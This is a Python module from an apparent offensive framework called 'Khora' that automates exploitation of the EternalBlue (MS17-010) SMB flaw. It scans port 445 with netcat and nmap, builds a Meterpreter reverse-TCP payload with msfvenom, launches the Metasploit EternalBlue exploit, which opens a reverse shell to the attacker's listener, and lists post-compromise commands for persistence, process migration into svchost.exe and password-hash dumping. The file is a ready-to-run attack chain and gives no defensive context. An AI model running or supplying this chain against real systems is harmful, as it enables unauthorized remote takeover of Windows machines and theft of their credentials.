"""
EternalBlue Module - MS17-010 SMB Exploitation
Vulnerability Detection, Staged Exploitation, Post-Compromise Automation
"""

import subprocess
import sys
import os
import logging
import json
from pathlib import Path
from datetime import datetime

logger = logging.getLogger("Khora.EternalBlue")

class EternalBlueModule:
    def __init__(self, target, lhost, lport):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.vulnerable = False
        self.exploit_status = {}
        
        Path("logs").mkdir(exist_ok=True)
        Path("results").mkdir(exist_ok=True)
    
    def check_smb_port(self):
        """Check if SMB port 445 is open"""
        print(f"[*] Checking SMB port (445) on {self.target}...")
        try:
            result = subprocess.run(
                ["nc", "-z", self.target, "445"],
                capture_output=True, timeout=10
            )
            if result.returncode == 0:
                print("  [✓] SMB port 445 open")
                logger.info(f"SMB port 445 open on {self.target}")
                return True
            else:
                print("  [✗] SMB port 445 closed")
                return False
        except FileNotFoundError:
            print("  [!] nc (netcat) not found")
            return False
        except Exception as e:
            print(f"  [!] Error: {e}")
            return False
    
    def scan_with_nmap(self):
        """Scan for MS17-010 vulnerability using Nmap script"""
        print(f"[*] Running Nmap MS17-010 scan...")
        try:
            result = subprocess.run([
                "nmap", "-p", "445", 
                "--script", "smb-vuln-ms17-010",
                "--script-args", "smb-enum-os.nt_version=all",
                self.target
            ], capture_output=True, text=True, timeout=120)
            
            output = result.stdout + result.stderr
            
            if "VULNERABLE" in output or "vulnerable" in output.lower():
                print("  [✓] MS17-010 VULNERABLE!")
                print("  [+] EternalBlue exploitation possible")
                self.vulnerable = True
                logger.info(f"Target {self.target} vulnerable to MS17-010")
                return True
            elif "UNKNOWN" in output:
                print("  [?] MS17-010 status UNKNOWN (SMB disabled?)")
                return None
            else:
                print("  [✗] MS17-010 not vulnerable")
                logger.warning(f"Target {self.target} not vulnerable to MS17-010")
                return False
                
        except FileNotFoundError:
            print("  [!] nmap not found - skipping Nmap scan")
            logger.warning("nmap not available")
            return None
        except subprocess.TimeoutExpired:
            print("  [!] Nmap scan timeout")
            return None
    
    def launch_msf_exploit_staged(self):
        """Launch staged Metasploit exploit"""
        print(f"\n[*] Launching Metasploit staged exploit...")
        
        # Generate MSFVenom payload
        print(f"  [+] Generating MSFVenom payload...")
        
        msfvenom_cmd = [
            "msfvenom",
            "-p", "windows/meterpreter/reverse_tcp",
            f"LHOST={self.lhost}", f"LPORT={self.lport}",
            "-f", "exe",
            "-o", "payloads/eternalblue_payload.exe"
        ]
        
        try:
            result = subprocess.run(msfvenom_cmd, capture_output=True, text=True, timeout=30)
            if os.path.exists("payloads/eternalblue_payload.exe"):
                print("  [✓] Payload generated: payloads/eternalblue_payload.exe")
                logger.info("MSFVenom payload created")
                self.exploit_status['payload'] = 'generated'
                return True
            else:
                print("  [!] Payload generation failed")
                self.exploit_status['payload'] = 'failed'
                return False
        except FileNotFoundError:
            print("  [!] msfvenom not found")
            print("  [!] Install: sudo apt install metasploit-framework")
            self.exploit_status['payload'] = 'not_found'
            return False
    
    def launch_msf_exploit(self):
        """Launch MSF EternalBlue exploit"""
        if not self.vulnerable:
            print("[!] Target not confirmed vulnerable - skipping exploit")
            return False
        
        print(f"\n[*] Launching Metasploit EternalBlue exploit...")
        print(f"  Target: {self.target}")
        print(f"  Listener: {self.lhost}:{self.lport}\n")
        
        msf_commands = f"""
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {self.target}
set LHOST {self.lhost}
set LPORT {self.lport}
set ExitOnSession false
set Payload windows/meterpreter/reverse_tcp
exploit
"""
        
        try:
            result = subprocess.run(
                ["msfconsole", "-q", "-x", msf_commands.strip()],
                capture_output=True, text=True, timeout=300
            )
            
            if "Listener started" in result.stdout or "Session" in result.stdout:
                print("  [✓] Exploit completed")
                self.exploit_status['exploit'] = 'completed'
                logger.info("EternalBlue exploit completed")
                return True
            else:
                print("  [+] Exploit launched (check msfconsole for details)")
                print(result.stdout[:500])
                self.exploit_status['exploit'] = 'launched'
                return True
                
        except FileNotFoundError:
            print("  [!] msfconsole not found")
            print("  [!] Manual method:")
            print(f"    1. msfconsole")
            print(f"    2. use exploit/windows/smb/ms17_010_eternalblue")
            print(f"    3. set RHOSTS {self.target}")
            print(f"    4. set LHOST {self.lhost}")
            print(f"    5. set LPORT {self.lport}")
            print(f"    6. exploit")
            self.exploit_status['exploit'] = 'manual_required'
            return False
    
    def post_exploitation(self):
        """Generate post-exploitation commands"""
        print(f"\n[*] Post-Exploitation Commands:")
        
        post_commands = {
            'Meterpreter': [
                'sysinfo',
                'ipconfig /all',
                'whoami /all',
                'net user',
                'net localgroup',
                'net use',
                'tasklist /v',
                'Get-Process | Select Name,ProcessId,Path'
            ],
            'Persistence': [
                'run persistence -X -i 10 -p 4444 -r ' + self.lhost,
                'run migrate -N svchost.exe',
                'run hashdump'
            ]
        }
        
        for category, commands in post_commands.items():
            print(f"\n  [{category}]")
            for cmd in commands:
                print(f"    > {cmd}")
        
        logger.info("Post-exploitation recommendations provided")
        self.exploit_status['post_exploitation'] = 'documented'
    
    def save_results(self):
        """Save exploitation results"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
            results_file = Path("results") / f"eternalblue_results_{timestamp}.json"
            
            with open(results_file, 'w') as f:
                json.dump({
                    'target': self.target,
                    'timestamp': datetime.now().isoformat(),
                    'vulnerable': self.vulnerable,
                    'status': self.exploit_status
                }, f, indent=2)
            
            logger.info(f"Results saved to {results_file}")
            
        except Exception as e:
            logger.error(f"Save results error: {e}")
    
    def run(self):
        """Execute EternalBlue exploitation chain"""
        print(f"\n{'='*70}")
        print("ETERNALBLUE MODULE - MS17-010 SMB EXPLOITATION".center(70))
        print('='*70 + "\n")
        
        logger.info(f"EternalBlue module started for {self.target}")
        
        # Step 1: SMB Port Check
        if not self.check_smb_port():
            print("\n[!] SMB port closed - exploitation impossible")
            logger.error("SMB port not open")
            return
        
        # Step 2: Vulnerability Scan
        vuln_result = self.scan_with_nmap()
        
        # Step 3: Generate Payload
        self.launch_msf_exploit_staged()
        
        # Step 4: Launch Exploit
        if vuln_result is not False:
            self.launch_msf_exploit()
        
        # Step 5: Post-Exploitation
        self.post_exploitation()
        
        # Save results
        self.save_results()
        
        print(f"\n{'='*70}")
        print(f"EternalBlue Module Complete".center(70))
        print('='*70 + "\n")

def run(target, lhost, lport=4444):
    """Khora Framework entrypoint - EternalBlue Module"""
    
    print(f"[*] Target: {target}")
    print(f"[*] Listener: {lhost}:{lport}\n")
    
    eternalblue = EternalBlueModule(target, lhost, lport)
    eternalblue.run()